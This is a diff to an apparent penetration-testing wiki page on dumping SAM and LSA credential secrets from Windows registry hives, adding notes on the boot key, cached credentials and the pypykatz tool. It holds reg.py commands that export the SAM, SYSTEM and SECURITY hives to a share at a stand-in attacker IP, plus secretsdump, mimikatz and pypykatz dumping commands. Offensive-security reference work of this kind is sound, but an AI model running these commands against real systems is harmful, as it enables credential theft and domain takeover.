@@ -12,9 +12,11 @@ In Windows environments, passwords are stored in a hashed format in registry hiv
 
 | Hive | Details | Format or credential material |
 | -------- | -------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| SAM | stores locally cached credentials (referred to as SAM secrets) | LM or NT hashes |
-| SECURITY | stores domain cached credentials (referred to as LSA secrets) | Plaintext passwords, LM or NT hashes, Kerberos keys (DES, AES), Domain Cached Credentials (DCC1 and DCC2), Security Questions (`L$`*`SQSA`*`<SID>`),  |
+| SAM | stores local account credentials (referred to as SAM secrets) | LM or NT hashes |
+| SECURITY | stores domain cached credentials (referred to as LSA secrets) | Plaintext passwords, LM or NT hashes, Kerberos keys (DES, AES), Domain Cached Credentials (DCC1 and DCC2), Security Questions (`L$`*`SQSA`*`<SID>`) |
 | SYSTEM | contains enough info to decrypt SAM secrets and LSA secrets | N/A |
+
+The `SYSTEM` hive holds no credentials of its own: it stores the **boot key** (also known as *syskey*), a 16-byte value hidden in the class names of the `JD`, `Skew1`, `GBG` and `Data` subkeys of `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`. That boot key seeds the decryption of both SAM and LSA secrets, which is why offline dumping always requires the `SYSTEM` hive alongside the `SAM` and/or `SECURITY` hive.
 
 SAM and LSA secrets can be dumped either locally or remotely from the mounted registry hives. These secrets can also be extracted offline from the exported hives. Once the secrets are extracted, they can be used for various attacks, depending on the credential format.
 
@@ -26,6 +28,9 @@ SAM and LSA secrets can be dumped either locally or remotely from the mounted re
 | Kerberos keys (DES, AES) | [credential cracking](../cracking.md), [pass-the-key](../../kerberos/pass-the/ptk.md) or [silver tickets](../../kerberos/forged-tickets/) |
 | Domain Cached Credentials (DCC1 or DCC2) | [credential cracking](../cracking.md) |
 
+> [!NOTE]
+> Domain Cached Credentials (DCC1, a.k.a. `mscash`, pre-Vista; DCC2, a.k.a. `mscash2`, Vista and later) are one-way logon verifiers, not reusable secrets: they cannot be replayed with [pass-the-hash](../../ntlm/pth.md) and can only be [cracked](../cracking.md). DCC2 is especially slow to crack, being PBKDF2-HMAC-SHA1 over 10240 iterations.
+
 ## Practice
 
 ### Exfiltration
@@ -34,7 +39,7 @@ SAM and LSA secrets can be dumped either locally or remotely from the mounted re
 
 === UNIX-like
 
-[Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a [Backup Operator](../../builtins/security-groups) member to a Domain Admin by dumping a Domain Controller's secrets and use them for a [DCSync](dcsync.md).
+[Impacket](https://github.com/fortra/impacket)'s reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a [Backup Operator](../../builtins/security-groups) member to a Domain Admin by dumping a Domain Controller's secrets and use them for a [DCSync](dcsync.md).
 
 > [!TIP]
 > The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.
@@ -44,12 +49,13 @@ SAM and LSA secrets can be dumped either locally or remotely from the mounted re
 smbserver.py -smb2support "someshare" "./"
 
 # save each hive manually
-reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\$ATTACKER_IPs\someshare'
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\$ATTACKER_IP\someshare'
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\$ATTACKER_IP\someshare'
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\$ATTACKER_IP\someshare'
 
 # backup all SAM, SYSTEM and SECURITY hives at once
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\$ATTACKER_IP\someshare'
+```
 
 
 === Live Windows
@@ -85,6 +91,9 @@ When Windows is not running, the hives are not mounted and they can be copied ju
 \system32\config\system
 ```
 
+> [!TIP]
+> If the primary hives are locked or unavailable, backup copies may be found at `\Windows\System32\config\RegBack\` (frequently empty since Windows 10 1803, when automatic backups were disabled by default) and, on older systems, `\Windows\repair\`.
+
 :::
 
 
@@ -96,7 +105,7 @@ Here are some examples and tools that can be used for local/remote/offline dumpi
 
 === secretsdump
 
-[Impacket](https://github.com/SecureAuthCorp/impacket)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like [pass-the-hash](../../ntlm/pth.md) (LM/NTLM), or [pass-the-ticket](../../kerberos/pass-the/ptt.md) (Kerberos).
+[Impacket](https://github.com/fortra/impacket)'s [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like [pass-the-hash](../../ntlm/pth.md) (LM/NTLM), or [pass-the-ticket](../../kerberos/pass-the/ptt.md) (Kerberos).
 
 ```bash
 # Remote dumping of SAM & LSA secrets
@@ -116,6 +125,9 @@ secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL
 
 # Offline dumping of SAM & LSA secrets from exported hives
 secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
+
+# Offline dumping including password history (-history)
+secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' -history LOCAL
 ```
 
 
@@ -155,6 +167,24 @@ lsadump::secrets
 # Offline dumping LSA secrets from exported hives
 lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
 ```
+
+
+=== pypykatz
+
+[pypykatz](https://github.com/skelsec/pypykatz) (Python) is a cross-platform reimplementation of Mimikatz that can parse exported hives offline, without a Windows machine. The `SYSTEM` hive is passed as a positional argument, the `SAM` and `SECURITY` hives with dedicated options.
+
+```bash
+# Offline dumping of SAM & LSA secrets from exported hives
+pypykatz registry --sam '/path/to/sam.save' --security '/path/to/security.save' '/path/to/system.save'
+
+# Local dumping from the running machine's registry
+pypykatz live registry
+```
+
+
+=== secretsdump.com
+
+[secretsdump.com](https://secretsdump.com) is a client-side reimplementation of Impacket's offline `secretsdump.py`, written in Rust and compiled to WebAssembly. The `SYSTEM`, `SAM`, `SECURITY` and `NTDS.dit` files are dropped into the browser and parsed locally to recover the boot key, SAM NT/LM hashes, LSA secrets and DCC2 cached logons. Nothing is uploaded, which is convenient for quick offline triage without installing tooling, or when the hives must not leave the analyst's machine.
 
 :::
 
